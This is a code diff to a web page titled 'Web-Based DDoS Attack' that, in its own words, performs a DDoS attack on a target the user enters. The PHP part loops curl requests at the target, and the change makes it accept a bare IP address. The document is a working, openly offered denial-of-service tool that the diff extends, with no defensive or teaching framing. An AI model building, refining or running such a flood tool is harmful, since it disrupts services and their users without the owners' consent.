@@ -4,9 +4,9 @@
 </head>
 <body>
 <h1>Web-Based DDoS Attack</h1>
-<p>This webpage will perform a DDoS attack on the target URL you specify.</p>
+<p>This webpage will perform a DDoS attack on the target IP address you specify.</p>
 <form action="attack.php" method="post">
-<label for="target">Target URL:</label>
+<label for="target">Target IP Address:</label>
 <input type="text" id="target" name="target"><br>
 <label for="requests">Number of Requests:</label>
 <input type="number" id="requests" name="requests"><br>
@@ -22,7 +22,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     
     for ($i = 0; $i < $requests; $i++) {
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $target);
+        curl_setopt($ch, CURLOPT_URL, "http://" . $target);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         $output = curl_exec($ch);
         curl_close($ch);
